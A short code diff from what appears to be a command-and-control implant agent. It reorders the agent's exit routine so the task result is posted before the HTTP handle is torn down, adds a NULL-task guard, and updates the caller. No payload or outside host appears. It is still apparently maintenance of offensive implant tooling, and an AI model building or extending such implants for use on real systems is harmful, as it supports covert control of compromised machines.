@@ -30,11 +30,13 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 }
 
 void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
+	if (task != NULL) {
+		perform_post(state, task, "", "success");
+	}
+
 	HttpDestroy(state->http);
 	free_params(&state->params);
-	free_picos(cap);
-	
-	perform_post(state, task, "", "success");
+	free_picos(cap);	
 	
 	#ifdef CELEBI_EXIT_THREAD
 	KERNEL32$ExitThread(0);
@@ -104,7 +106,7 @@ void go() {
 		#endif
 		
 		free_checkin_reply(&checkin_reply);
-		agent_exit(&state, &capabilities);
+		agent_exit(&state, &capabilities, NULL);
 		return;
 	}
 	
